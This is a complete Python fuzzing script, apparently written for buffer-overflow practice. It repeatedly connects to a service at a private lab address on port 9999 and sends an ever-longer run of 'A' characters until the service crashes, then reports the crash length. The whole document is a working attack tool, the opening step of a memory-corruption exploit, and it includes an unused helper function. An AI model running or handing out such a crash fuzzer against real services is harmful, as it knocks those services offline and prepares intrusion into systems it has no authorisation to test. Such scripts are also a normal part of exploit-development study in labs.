import socket, time, sys

ip = "192.168.3.129"

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 2005
def send_name(s):
    sent=False
    name=""
    if not sent:
        print("sent name {}".format(name))
        sent=True
        s.send(bytes(name + "\r\n", "latin-1"))

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            s.send(bytes("" + "\r\n", "latin-1"))
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string + "\r\n", "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 1 * "A"
    time.sleep(1)
